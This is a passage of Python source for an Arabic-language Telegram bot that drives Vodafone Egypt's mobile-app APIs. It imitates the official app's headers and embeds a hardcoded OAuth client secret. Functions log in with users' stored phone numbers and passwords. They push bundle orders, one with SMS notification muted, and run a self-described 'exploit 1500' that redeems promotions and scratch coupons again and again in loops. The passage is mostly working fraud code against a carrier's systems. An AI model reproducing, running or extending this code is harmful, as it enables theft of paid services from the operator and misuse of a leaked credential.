    فحص تأهيل الخط لنوتة 15 — مطابق للملف الأصلي استعلام_تاهيل_النوته.py
    يرجع {"eligible": True/False, "reason": ...}
    """
    url = "https://mobile.vodafone.com.eg/services/dxl/orderor/productOrder"
    headers = {
        'Authorization': f'Bearer {token}',
        'api-version': 'v2',
        'device-id': 'e9d4a11e561390bd',
        'x-agent-operatingsystem': 'Yello',
        'clientId': 'AnaVodafoneAndroid',
        'x-agent-device': 'Mello',
        'x-agent-version': '2025.1.1',
        'x-agent-build': '1002',
        'msisdn': number,
        'Accept': 'application/json',
        'Accept-Language': 'ar',
        'Content-Type': 'application/json; charset=UTF-8',
        'Host': 'mobile.vodafone.com.eg',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'User-Agent': 'okhttp/4.12.0'
    }
    payload = {
        "payment": [{"characteristics": [], "@type": "ACP"}],
        "productOrderItem": [{
            "characteristics": [
                {"name": "MSISDN", "@type": "receiver", "value": f"2{number}"},
                {"name": "MSISDN", "@type": "sender", "value": f"2{number}"}
            ],
            "itemTotalPrice": [{"price": {"taxIncludedAmount": {"unit": "EGP", "value": "0.0"}}}],
            "product": {
                "id": "Flex_17.5_2019",
                "productCharacteristic": [{"@type": "token", "value": "welcomeback", "valueType": "string"}],
                "type": "product"
            }
        }],
        "@type": "paymentFlex"
    }
    # الـ reasons اللي معناها الخط مؤهل
    ELIGIBLE_REASONS = [
        "In Grace period",
        "customer has Flex Family",
    ]

    try:
        response = requests.post(url, json=payload, headers=headers, timeout=15)
        data = response.json()
        reason = data.get("reason", "")

        # أي reason في قائمة المؤهلين = مؤهل
        if reason in ELIGIBLE_REASONS:
            return {"eligible": True, "reason": reason}
        # لو فيه reason تاني = مش مؤهل
        elif reason:
            return {"eligible": False, "reason": reason}
        # لو مفيش reason خالص = مش مؤهل
        else:
            return {"eligible": False, "reason": "غير معروف"}
    except Exception as e:
        return {"eligible": False, "reason": f"خطأ في الاتصال: {str(e)}"}


def run_check_nota_eligibility(user_id, message_id, session):
    """
    تنفيذ استعلام تأهيل النوتة للمستخدم المسجل
    إصلاح: تسجيل دخول بـ headers الملف الأصلي بدل get_fresh_token العادي
    """
    try:
        number = session['number']
        password = session['password']

        # تسجيل دخول بـ headers خاصة بالنوتة
        token = _nota_login(number, password)
        if not token:
            try:
                bot.edit_message_text("❌ فشل تسجيل الدخول! تحقق من الرقم وكلمة المرور.", user_id, message_id)
            except:
                bot.send_message(user_id, "❌ فشل تسجيل الدخول!")
            return

        result = check_nota_eligibility_api(number, token)

        if result["eligible"]:
            text = (
                "╔════════════════════════════════════════╗\n"
                "║                                        ║\n"
                "║   ✅ خطك مؤهل يصحبي روح فعّل 😉🔥    ║\n"
                "║                                        ║\n"
                "╚════════════════════════════════════════╝\n\n"
                f"📱 الرقم: {number}"
            )
        else:
            text = (
                "╔════════════════════════════════════════╗\n"
                "║                                        ║\n"
                "║    ❌ خطك غير مؤهل يابوب ☢️✖️         ║\n"
                "║                                        ║\n"
                "╚════════════════════════════════════════╝\n\n"
                f"📱 الرقم: {number}\n"
                f"📋 السبب: {result.get('reason', 'غير معروف')}"
            )
        try:
            bot.edit_message_text(text, user_id, message_id)
        except:
            bot.send_message(user_id, text)

    except Exception as e:
        try:
            bot.edit_message_text(f"❌ خطأ غير متوقع: {str(e)}", user_id, message_id)
        except:
            bot.send_message(user_id, f"❌ خطأ غير متوقع: {str(e)}")


def _nota15_activate_acp(number, token):
    """
    الخطوة 1 من نوتة 15: FlexACPRenewal — مطابق للملف الأصلي Nota15.py
    إصلاح: أي رد 200/201 أيضاً = نجاح، مش بس كود 3999
    """
    target_plan = "Flex_17.5_2019"
    url = "https://mobile.vodafone.com.eg/services/dxl/pom/productOrder"
    headers = {
        "api-host": "ProductOrderingManagement",
        "useCase": "FlexACPRenewal",
        "Authorization": f"Bearer {token}",
        "api-version": "v2",
        "x-agent-operatingsystem": "16",
        "clientId": "AnaVodafoneAndroid",
        "x-agent-version": "2026.1.1",
        "x-agent-build": "1100",
        "msisdn": number,
        "Accept": "application/json",
        "Accept-Language": "en",
        "Content-Type": "application/json; charset=UTF-8",
        "Host": "mobile.vodafone.com.eg",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/4.11.0"
    }
    payload = {
        "channel": {"name": "MobileApp"},
        "orderItem": [{
            "action": "insert",
            "id": target_plan,
            "product": {
                "characteristic": [
                    {"name": "PaymentMethod", "value": "ACP"},
                    {"name": "ACP", "value": "True"}
                ],
                "relatedParty": [
                    {"id": number, "name": "MSISDN", "role": "Subscriber"}
                ]
            },
            "eCode": 0
        }],
        "@type": "FlexACPRenewal"
    }

    last_error = ""
    for attempt in range(3):
        try:
            resp = requests.post(url, json=payload, headers=headers, timeout=20)
            # نجاح مباشر
            if resp.status_code in (200, 201):
                return True, ""
            # كود 500 مع Generic System Error = نجاح (نفس الملف الأصلي)
            if resp.status_code == 500:
                try:
                    data = resp.json()
                    if data.get("code") == "3999" and data.get("reason") == "Generic System Error":
                        return True, ""
                    last_error = f"كود {data.get('code','')}: {data.get('reason','')}"
                except Exception:
                    last_error = f"HTTP 500"
            else:
                try:
                    data = resp.json()
                    last_error = f"HTTP {resp.status_code} — {data.get('reason', resp.text[:80])}"
                except Exception:
                    last_error = f"HTTP {resp.status_code}"
        except Exception as e:
            last_error = str(e)

        if attempt < 2:
            time.sleep(3)

    return False, last_error


def _nota15_get_enc_id(number, token):
    """
    الخطوة 2 من نوتة 15: جلب encProductId — مطابق للملف الأصلي Nota15.py
    إصلاح: try/except بدل raise_for_status المباشر
    """
    bundle_id = "Flex_2021_523"
    url = "https://mobile.vodafone.com.eg/services/dxl/pim/product"
    params = {
        'relatedParty.id': number,
        '@type': "FlexProfile"
    }
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'api-host': "ProductInventoryManagementHost",
        'useCase': "FlexProfile",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'device-id': "b8a",
        'x-agent-operatingsystem': "13",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "Xiaomi",
        'x-agent-version': "2026.2.3",
        'x-agent-build': "1117",
        'msisdn': number,
        'Content-Type': "application/json",
        'Accept-Language': "ar"
    }
    try:
        resp = requests.get(url, params=params, headers=headers, timeout=15)
        if resp.status_code != 200:
            return None, f"فشل جلب FlexProfile (HTTP {resp.status_code})"
        products = resp.json()
        if not isinstance(products, list):
            return None, "رد غير متوقع من API"
        for prod in products:
            if prod.get("id") == bundle_id:
                enc_id = prod.get("productOffering", {}).get("encProductId")
                if enc_id:
                    return enc_id, ""
        return None, "encProductId غير موجود — الخط قد لا يكون على فليكس 260"
    except Exception as e:
        return None, str(e)


def _nota15_renew(number, token, enc_product_id):
    """
    الخطوة 3 من نوتة 15: FlexRenew — مطابق للملف الأصلي Nota15.py
    شرط النجاح: status 201 + state=Completed + orderTotalPrice=[]
    """
    bundle_id = "Flex_2021_523"
    url = "https://web.vodafone.com.eg/services/dxl/pom/productOrder"
    payload = {
        "channel": {"name": "MobileApp"},
        "orderItem": [{
            "action": "repurchase",
            "product": {
                "relatedParty": [{"id": number, "name": "MSISDN", "role": "Subscriber"}],
                "id": bundle_id,
                "encProductId": enc_product_id
            }
        }],
        "@type": "FlexRenew"
    }
    headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
        'Accept': "application/json",
        'Accept-Encoding': "gzip, deflate, br, zstd",
        'Content-Type': "application/json",
        'sec-ch-ua-platform': '"Android"',
        'Authorization': f"Bearer {token}",
        'Accept-Language': "AR",
        'msisdn': number,
        'clientId': "WebsiteConsumer",
        'x-dtpc': "8$520322742_321h64vFRWDWFKHOORAMRQQWKPOKBNKIFMHSLQU-0e0",
        'sec-ch-ua-mobile': "?1",
        'Origin': "https://web.vodafone.com.eg",
        'Sec-Fetch-Site': "same-origin",
        'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty",
        'Referer': "https://web.vodafone.com.eg/spa/flexManagement/usage",
    }
    try:
        resp = requests.post(url, json=payload, headers=headers, timeout=20)
        if resp.status_code == 201:
            try:
                data = resp.json()
                if data.get("state") == "Completed" and isinstance(data.get("orderTotalPrice"), list):
                    return True, ""
                return False, f"state={data.get('state','؟')} — التجديد لم يكتمل"
            except Exception:
                return False, "فشل تحليل رد التجديد"
        try:
            data = resp.json()
            return False, f"HTTP {resp.status_code} — {data.get('reason', resp.text[:80])}"
        except Exception:
            return False, f"HTTP {resp.status_code}"
    except Exception as e:
        return False, str(e)


def run_activate_nota15(user_id, message_id, session):
    """
    تنفيذ تفعيل نوتة 15 كامل بالـ 3 مراحل
    إصلاح: تسجيل دخول بـ headers خاصة + معالجة صحيحة لكل مرحلة
    """
    number = session['number']
    password = session['password']

    def _edit(text):
        try:
            bot.edit_message_text(text, user_id, message_id)
        except Exception:
            pass

    try:
        # المرحلة 1: تسجيل الدخول
        _edit("⏳ جاري تفعيل النوتة...\n\n🔐 المرحلة 1/3: تسجيل الدخول")
        token = _nota_login(number, password)
        if not token:
            _edit("❌ فشل تسجيل الدخول!\n\nتحقق من الرقم وكلمة المرور.")
            return

        # المرحلة 2: تفعيل ACP
        _edit("⏳ جاري تفعيل النوتة...\n\n📦 المرحلة 2/3: تفعيل الباقة (ACP)")
        ok, err = _nota15_activate_acp(number, token)
        if not ok:
            _edit(f"❌ فشل تفعيل الباقة\n\n📋 السبب: {err}\n\nتأكد أن الخط مؤهل أولاً.")
            return

        # المرحلة 3: جلب encProductId ثم التجديد
        _edit("⏳ جاري تفعيل النوتة...\n\n🔄 المرحلة 3/3: التجديد النهائي")
        enc_id, err2 = _nota15_get_enc_id(number, token)
        if not enc_id:
            _edit(f"❌ فشل جلب بيانات الباقة\n\n📋 السبب: {err2}")
            return

        ok2, err3 = _nota15_renew(number, token, enc_id)
        if ok2:
            text = (
                f"✅ تم تفعيل النوتة 15 بنجاح!\n\n"
                f"📱 الرقم: {number}\n"
                f"🕒 {datetime.now(egypt_tz).strftime('%Y-%m-%d %H:%M:%S')}"
            )
        else:
            text = (
                f"❌ فشل تفعيل النوتة في المرحلة الأخيرة\n\n"
                f"📱 الرقم: {number}\n"
                f"📋 السبب: {err3}\n\n"
                f"تأكد أن الخط مؤهل وحاول مجدداً."
            )
        try:
            bot.edit_message_text(text, user_id, message_id)
        except Exception:
            bot.send_message(user_id, text)

    except Exception as e:
        try:
            bot.edit_message_text(f"❌ خطأ غير متوقع: {str(e)}", user_id, message_id)
        except Exception:
            bot.send_message(user_id, f"❌ خطأ غير متوقع: {str(e)}")

def _nota40_bundle1(msisdn, token):
    """الخطوة الأولى لنوتة 40: FlexACPRenewal على Flex_2021_511"""
    url = "https://mobile.vodafone.com.eg/services/dxl/pom/productOrder"
    json_data = {
        'channel': {'name': 'MobileApp'},
        'orderItem': [{
            'action': 'insert',
            'id': 'Flex_2021_511',
            'product': {
                'characteristic': [
                    {'name': 'PaymentMethod', 'value': 'ACP'},
                    {'name': 'ACP', 'value': 'True'},
                    {'name': 'SMSID', 'value': 'MUTE_SMS'},
                ],
                'encProductId': 'SBWbw/gsvm1cU1nPBj7HCg6MNEaAfyY56Kxz53nXBwpe6Z4c2t1DgiO2OM2hZwGVJaztwhZu7DWZiE2Ic5evFLqZfV/QaAOWQcS3m8bZCVD/wmRvbEvtfv16FTwgzWMjUQErPqXuYIMnePuK3H+MwQ8iFKqpvQ1d7qrPz05JlpUXKn2GM14uKA==',
                'id': 'Flex_2021_511',
                'relatedParty': [{'id': msisdn, 'name': 'MSISDN', 'role': 'Subscriber'}],
            },
            'eCode': 0,
        }],
        '@type': 'FlexACPRenewal',
    }
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Connection': 'Keep-Alive',
        'Accept': 'application/json',
        'api-host': 'ProductOrderingManagement',
        'useCase': 'FlexACPRenewal',
        'Authorization': f'Bearer {token}',
        'api-version': 'v2',
        'device-id': '7be546fe335911d2',
        'x-agent-operatingsystem': '13',
        'clientId': 'AnaVodafoneAndroid',
        'x-agent-device': 'Samsung SM-A515F',
        'x-agent-version': '2025.11.1',
        'x-agent-build': '1063',
        'msisdn': msisdn,
        'Accept-Language': 'ar',
        'Content-Type': 'application/json; charset=UTF-8',
    }
    try:
        response = requests.post(url, headers=headers, json=json_data, timeout=40)
        return response.status_code in (200, 201), response.status_code, response.text[:200]
    except Exception as e:
        return False, 0, str(e)


def _nota40_bundle2(msisdn, token):
    """الخطوة الثانية لنوتة 40: AllInOneOffer على Flex_2021_523"""
    url = "https://mobile.vodafone.com.eg/services/dxl/pom/productOrder"
    payload = {
        "channel": {"name": "MobileApp"},
        "orderItem": [{
            "action": "add",
            "product": {
                "characteristic": [
                    {"name": "LangId", "value": "en"},
                    {"name": "ExecutionType", "value": "Sync"}
                ],
                "id": "Flex_2021_523",
                "relatedParty": [{"id": msisdn, "name": "MSISDN", "role": "Subscriber"}]
            }
        }],
        "@type": "AllInOneOffer"
    }
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'device-id': "ba4068643748bc78",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "HONOR ALI-NX1",
        'x-agent-version': "2025.11.1.1",
        'x-agent-build': "1064",
        'msisdn': msisdn,
        'Accept-Language': "ar",
        'Content-Type': "application/json; charset=UTF-8"
    }
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=40)
        try:
            rdata = response.json()
        except:
            rdata = {}
        return rdata.get("code") in ["2255"] or response.status_code in (200, 201, 202), response.status_code, response.text[:200]
    except Exception as e:
        return False, 0, str(e)


def _nota40_login(number, password):
    """تسجيل دخول خاص بنوتة 40"""
    url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
    data = {
        'grant_type': 'password',
        'username': number,
        'password': password,
        'client_secret': '95fd95fb-7489-4958-8ae6-d31a525cd20a',
        'client_id': 'ana-vodafone-app'
    }
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip',
        'silentLogin': 'true',
        'x-agent-operatingsystem': '11',
        'clientId': 'AnaVodafoneAndroid',
        'Accept-Language': 'ar',
        'x-agent-device': 'OPPO oppo6779',
        'x-agent-version': '2025.11.1',
        'x-agent-build': '1063',
        'digitalId': '2B8218UYN6RPV',
        'device-id': '70d3004b2bd92694'
    }
    try:
        r = requests.post(url, data=data, headers=headers, timeout=30)
        r.raise_for_status()
        return r.json()['access_token']
    except Exception as e:
        return None


def run_activate_nota40(user_id, message_id, session):
    """تفعيل نوتة 40 — خطوتين كما في bot-3.py"""
    number = session['number']
    password = session['password']

    def _edit(text):
        try:
            bot.edit_message_text(text, user_id, message_id)
        except Exception:
            pass

    try:
        # تنظيف رقم الهاتف
        username = number
        if username.startswith('+2'):
            username = username[2:]
        elif username.startswith('2') and len(username) == 12:
            username = username[1:]

        # المرحلة 1: تسجيل الدخول
        _edit("⏳ جاري تسجيل الدخول...")
        token = _nota40_login(username, password)
        if not token:
            _edit("❌ فشل تسجيل الدخول!\n\nتأكد من الرقم وكلمة المرور.")
            return

        _edit("✅ تم تسجيل الدخول\n⏳ جاري تفعيل نوتة 40...")

        # المرحلة 2: الخطوة الأولى (صامتة)
        _nota40_bundle1(username, token)
        time.sleep(2)

        # المرحلة 3: الخطوة الثانية (النتيجة الفعلية)
        note_ok, n_status, n_text = _nota40_bundle2(username, token)

        now_str = datetime.now(egypt_tz).strftime('%Y-%m-%d %H:%M:%S')
        if note_ok:
            result = (
                f"✅ تم تفعيل نوتة 40 بنجاح!\n\n"
                f"📱 الرقم: {username}\n"
                f"💰 برجاء اشحن 52 صافي\n"
                f"🕒 {now_str}"
            )
        else:
            result = (
                f"❌ فشل تفعيل نوتة 40\n\n"
                f"📱 الرقم: {username}\n"
                f"🔴 السبب: خطك غير مؤهل لتفعيل النوتة في الوقت الحالي.\n"
                f"🕒 {now_str}"
            )

        try:
            bot.edit_message_text(result, user_id, message_id)
        except Exception:
            bot.send_message(user_id, result)

    except Exception as e:
        err = str(e)
        if "401" in err or "Invalid user credentials" in err:
            msg = "❌ فشل تسجيل الدخول\n\nتأكد من الرقم وكلمة السر."
        else:
            msg = f"❌ خطأ غير متوقع: {err[:150]}"
        try:
            bot.edit_message_text(msg, user_id, message_id)
        except Exception:
            bot.send_message(user_id, msg)


# ===== دوال ثغرة 1500 المتجددة (مدمجة من exploit_1500.py) =====
def validate_phone_exploit(phone: str) -> bool:
    """التحقق من صحة رقم الهاتف للثغرة"""
    phone = phone.strip()
    if not phone.isdigit():
        return False
    if len(phone) != 11:
        return False
    if not phone.startswith('01'):
        return False
    return True

def run_exploit_1500_start(user_id, message_id):
    """بدء عملية تفعيل الثغرة 1500"""
    # نستخدم بيانات الجلسة مباشرة
    session = get_user_session(user_id)
    if not session:
        bot.edit_message_text("❌ يجب تسجيل الدخول أولاً!", user_id, message_id)
        return
    # تشغيل الثغرة باستخدام بيانات الجلسة
    run_exploit_1500_activate(user_id, message_id, session['number'], session['password'])

def run_exploit_1500_password(user_id, message_id, phone):
    """طلب كلمة المرور بعد استلام الرقم - لن نستخدمها بعد تعديل الثغرة"""
    pass

def run_exploit_1500_activate(user_id, message_id, phone, password):
    """تنفيذ تفعيل الثغرة 1500 باستخدام بيانات الجلسة"""
    # إرسال رسالة بداية بدون صورة
    loading_msg = bot.send_message(
        user_id,
        "⏳ *جاري تفعيل الثغرة...*\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📱 الرقم: `{phone}`\n"
        "🔄 جاري تسجيل الدخول...\n\n"
        "⏳ المرحلة 1/3: تسجيل الدخول\n\n"
        "💎 flex master",
        parse_mode='Markdown'
    )

    # تفعيل الثغرة
    result = activate_exploit_1500(phone, password, loading_msg, user_id)

    # عرض النتيجة مع أزرار
    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("🔄 تجربة مرة تانية", callback_data="exploit_1500"),
        InlineKeyboardButton("🔙 رجوع للمنصة", callback_data="services_section")
    )
    try:
        bot.edit_message_text(
            result['message'],
            user_id, loading_msg.message_id,
            parse_mode='Markdown',
            reply_markup=keyboard
        )
    except:
        bot.send_message(user_id, result['message'], reply_markup=keyboard, parse_mode='Markdown')
    clear_user_state(user_id)

def activate_exploit_1500(phone, password, loading_msg, user_id):
    """تنفيذ الثغرة 1500 - نسخة متزامنة للاستخدام مع telebot"""
    try:
        # 1. تسجيل الدخول
        try:
            bot.edit_message_text(
                "⏳ *جاري تفعيل الثغرة...*\n\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📱 الرقم: `{phone}`\n"
                "🔐 جاري تسجيل الدخول...\n\n"
                "⏳ المرحلة 1/3: تسجيل الدخول\n\n"
                "💎 flex master",
                user_id, loading_msg.message_id,
                parse_mode='Markdown'
            )
        except:
            pass

        url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
        payload = {
            'grant_type': "password",
            'username': phone,
            'password': password,
            'client_secret': "95fd95fb-7489-4958-8ae6-d31a525cd20a",
            'client_id': "ana-vodafone-app"
        }
        headers = {
            "User-Agent": "okhttp/4.11.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip",
            "silentLogin": "true",
            "x-agent-operatingsystem": "15",
            "clientId": "AnaVodafoneAndroid",
            "Accept-Language": "ar",
            "x-agent-device": "HONOR ALI-NX1",
            "x-agent-version": "2025.11.1.1",
            "x-agent-build": "1064",
            "digitalId": "23ZYFNE2R7G1W",
            "device-id": "060372c24b51d07a",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        response = requests.post(url, data=payload, headers=headers, timeout=30)
        if response.status_code != 200:
            return {
                'success': False,
                'message': f"❌ *فشل تسجيل الدخول!*\n\n"
                          f"تأكد من:\n"
                          f"• صحة رقم الهاتف\n"
                          f"• صحة كلمة المرور\n"
                          f"• اتصالك بالإنترنت\n\n"
                          f"💎 flex master"
            }
        token = response.json()['access_token']

        # 2. السكربت الأول - تفعيل العرض 10 مرات
        try:
            bot.edit_message_text(
                "⏳ *جاري تفعيل الثغرة...*\n\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📱 الرقم: `{phone}`\n"
                "✅ تم تسجيل الدخول!\n"
                "⚡ جاري تفعيل العرض 10 مرات...\n\n"
                "⏳ المرحلة 2/3: تفعيل العروض الأساسية\n\n"
                "💎 flex master",
                user_id, loading_msg.message_id,
                parse_mode='Markdown'
            )
        except:
            pass

        successful_attempts = 0
        failed_attempts = 0

        url_promo = "https://mobile.vodafone.com.eg/mobile-app-upgrade/promo/unifiedRedeemPromo"
        params = {'lang': "ar"}
        promo_payload = {
            "promoId": 2633,
            "channelId": "1",
            "wlistId": 2553,
            "contextualPromoId": "13",
            "triggerId": 189,
            "param3": "0.5",
            "param4": 2,
            "param6": 0,
            "param1": "5",
            "param2": 50
        }
        promo_headers = {
            'User-Agent': 'okhttp/4.11.0',
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'Authorization': f"Bearer {token}",
            'api-version': "v2",
            'device-id': "f8e5c068d2fc6287",
            'x-agent-operatingsystem': "15",
            'clientId': "AnaVodafoneAndroid",
            'x-agent-device': "HONOR ALI-NX1",
            'x-agent-version': "2025.11.1.1",
            'x-agent-build': "1064",
            'msisdn': phone,
            'buildNumber': "1064",
            'Content-Type': "application/json; charset=UTF-8"
        }

        for i in range(1, 11):
            try:
                r = requests.post(url_promo, params=params, data=json.dumps(promo_payload), headers=promo_headers, timeout=10)
                try:
                    response_data = r.json()
                    if 'message' in str(response_data).lower() or 'success' in str(response_data).lower():
                        successful_attempts += 1
                    else:
                        failed_attempts += 1
                except:
                    failed_attempts += 1

                # تحديث التقدم كل 2 محاولات
                if i % 2 == 0:
                    try:
                        bot.edit_message_text(
                            "⏳ *جاري تفعيل الثغرة...*\n\n"
                            "━━━━━━━━━━━━━━━━━━━━\n\n"
                            f"📱 الرقم: `{phone}`\n"
                            "✅ تم تسجيل الدخول!\n"
                            f"⚡ جاري تفعيل العرض... ({i}/10)\n\n"
                            f"✅ الناجحة: {successful_attempts}\n"
                            f"❌ الفاشلة: {failed_attempts}\n\n"
                            "⏳ المرحلة 2/3: تفعيل العروض الأساسية\n\n"
                            "💎 flex master",
                            user_id, loading_msg.message_id,
                            parse_mode='Markdown'
                        )
                    except:
                        pass
                if i < 10:
                    time.sleep(1)
            except Exception as e:
                failed_attempts += 1

        # 3. الانتظار 100 ثانية
        wait_time = 100
        for i in range(wait_time, 0, -10):
            try:
                bot.edit_message_text(
                    "⏳ *جاري تفعيل الثغرة...*\n\n"
                    "━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📱 الرقم: `{phone}`\n"
                    "✅ تم تسجيل الدخول!\n"
                    f"✅ تم تفعيل العرض 10 مرات!\n\n"
                    f"✅ الناجحة: {successful_attempts}\n"
                    f"❌ الفاشلة: {failed_attempts}\n\n"
                    f"⏳ انتظار {i} ثانية قبل المرحلة الثانية...\n\n"
                    "⏳ المرحلة 3/3: تفعيل جميع العروض\n\n"
                    "💎 flex master",
                    user_id, loading_msg.message_id,
                    parse_mode='Markdown'
                )
            except:
                pass
            time.sleep(10)

        # 4. السكربت الثاني - تفعيل جميع العروض
        try:
            bot.edit_message_text(
                "⏳ *جاري تفعيل الثغرة...*\n\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📱 الرقم: `{phone}`\n"
                "✅ تم تسجيل الدخول!\n"
                "🔥 جاري المرحلة الثانية...\n"
                "📋 جاري جلب العروض...\n\n"
                "⏳ المرحلة 3/3: تفعيل جميع العروض\n\n"
                "💎 flex master",
                user_id, loading_msg.message_id,
                parse_mode='Markdown'
            )
        except:
            pass

        max_attempts = 3
        all_success_count = 0
        all_failed_count = 0

        for attempt in range(1, max_attempts + 1):
            # إعادة تسجيل الدخول لكل محاولة
            if attempt > 1:
                token_response = requests.post(url, data=payload, headers=headers, timeout=10)
                if token_response.status_code == 200:
                    token = token_response.json()['access_token']

            promotions = get_all_promotions_1500(token, phone)
            if not promotions:
                if attempt < max_attempts:
                    time.sleep(30)
                continue

            success_count = 0
            failed_count = 0

            for i, promotion in enumerate(promotions, 1):
                promotion_id = promotion.get('id')
                promotion_name = promotion.get('promotionName', 'عرض غير معروف')[:30]

                if i % 5 == 0:
                    try:
                        bot.edit_message_text(
                            "⏳ *جاري تفعيل الثغرة...*\n\n"
                            "━━━━━━━━━━━━━━━━━━━━\n\n"
                            f"📱 الرقم: `{phone}`\n"
                            "✅ تم تسجيل الدخول!\n"
                            f"🎯 المرحلة الثانية - المحاولة {attempt}/{max_attempts}\n\n"
                            f"جاري تفعيل العرض {i}/{len(promotions)}...\n"
                            f"✅ مفعل: {success_count}\n"
                            f"❌ فاشل: {failed_count}\n\n"
                            "⏳ المرحلة 3/3: تفعيل جميع العروض\n\n"
                            "💎 flex master",
                            user_id, loading_msg.message_id,
                            parse_mode='Markdown'
                        )
                    except:
                        pass

                # محاولة تفعيل العرض 3 مرات
                status_code, msg = 0, "فشل"
                for promo_attempt in range(1, 4):
                    status_code, msg = activate_promotion_1500(token, phone, promotion_id)
                    if status_code in [200, 201, 204]:
                        success_count += 1
                        break
                    else:
                        if promo_attempt < 3:
                            time.sleep(2)

                if status_code not in [200, 201, 204]:
                    failed_count += 1

                if i < len(promotions):
                    time.sleep(3)

            all_success_count += success_count
            all_failed_count += failed_count

            if success_count == len(promotions):
                break
            elif attempt < max_attempts:
                time.sleep(15)

        return {
            'success': True,
            'message': f"""
✅ *تم تفعيل الثغرة بنجاح!*

━━━━━━━━━━━━━━━━━━━━

📱 الرقم: `{phone}`
🔥 الثغرة: 1500 متجددة

📊 *النتائج النهائية:*
✅ تفعيلات المرحلة الأولى: {successful_attempts}/10
✅ تفعيلات المرحلة الثانية: {all_success_count} عرض
❌ الفاشلة: {all_failed_count} عرض

━━━━━━━━━━━━━━━━━━━━
🎉 اكتمل جميع المراحل بنجاح!
💎 flex master
            """
        }

    except Exception as e:
        return {
            'success': False,
            'message': f"❌ *حدث خطأ غير متوقع!*\n\n"
                      f"حاول مرة أخرى أو تواصل مع المطور.\n\n"
                      f"💎 flex master"
        }

def get_all_promotions_1500(token, number, max_retries=5):
    """الحصول على جميع العروض مع إعادة محاولة"""
    for attempt in range(max_retries):
        try:
            url_get = "https://mobile.vodafone.com.eg/services/dxl/promo/promotion"
            params_get = {
                '@type': "Promo",
                '$.context.type': "scratchCoupon"
            }
            headers_get = {
                'User-Agent': "okhttp/4.12.0",
                'Connection': "Keep-Alive",
                'Accept': "application/json",
                'Accept-Encoding': "gzip",
                'channel': "MOBILE",
                'useCase': "Promo",
                'Authorization': f"Bearer {token}",
                'api-version': "v2",
                'x-agent-version': "2025.11.1.1",
                'x-agent-build': "1064",
                'msisdn': number,
                'Content-Type': "application/json",
                'Accept-Language': "ar"
            }
            response_get = requests.get(url_get, params=params_get, headers=headers_get, timeout=10)
            if response_get.status_code == 200:
                response_data = response_get.json()
                if isinstance(response_data, list):
                    return response_data
                else:
                    if hasattr(response_data, 'get') and 'promotions' in response_data:
                        return response_data.get('promotions', [])
                    return []
        except Exception as e:
            pass
        if attempt < max_retries - 1:
            time.sleep(2)
    return []

def activate_promotion_1500(token, number, promotion_id, max_retries=3):
    """تفعيل العرض مع إعادة محاولة"""
    for attempt in range(max_retries):
        try:
            url_post = "https://mobile.vodafone.com.eg/services/dxl/promo/promotion"
            payload_post = {
                "channel": {"id": "5"},
                "context": {"type": "scratchCoupon"},
                "pattern": [{"id": promotion_id}],
                "@type": "Promo"
            }
            headers_post = {
                'User-Agent': "okhttp/4.12.0",
                'Connection': "Keep-Alive",
                'Accept': "application/json",
                'Accept-Encoding': "gzip",
                'channel': "MOBILE",
                'useCase': "Promo",
                'Authorization': f"Bearer {token}",
                'api-version': "v2",
                'device-id': "f8e5c068d2fc6287",
                'x-agent-operatingsystem': "15",
                'clientId': "AnaVodafoneAndroid",
                'x-agent-device': "HONOR ALI-NX1",
                'x-agent-version': "2025.11.1.1",
                'x-agent-build': "1064",
                'msisdn': number,
                'Accept-Language': "ar",
                'Content-Type': "application/json; charset=UTF-8"
            }
            # الخطوة 1: POST
            response_post = requests.post(url_post, data=json.dumps(payload_post), headers=headers_post, timeout=10)
            # الخطوة 2: PATCH
            url_patch = f"https://mobile.vodafone.com.eg/services/dxl/promo/promotion/{promotion_id}"
            payload_patch = {
                "channel": {"id": "5"},
                "context": {"type": "scratchCoupon"},
                "@type": "Promo"
            }
            headers_patch = headers_post.copy()
            response_patch = requests.patch(url_patch, data=json.dumps(payload_patch), headers=headers_patch, timeout=10)
            if response_patch.status_code in [200, 201, 204]:
                return response_patch.status_code, "نجاح"
        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(2)
            else:
                return 0, str(e)
    return 0, "فشل بعد عدة محاولات"

# ===== دوال للحصول على شعار البوت (للاستخدام في الثغرة) =====
def get_logo():
    """الحصول على رابط شعار البوت (يمكن تعديله)"""
    try:
        with open("logo_url.txt", "r") as f:
            return f.read().strip()
    except:
        return "https://ibb.co/LDsRbjGV"  # رابط افتراضي

# ===== دوال جديدة لعرض النت الشهر التاني =====
def activate_second_month_bundle(number: str, password: str) -> str:
    """
    تنفيذ عرض النت الشهر التاني (MI_XC_CMBO_FlexActive_400) من ملف عرض النت.txt
    """
    try:
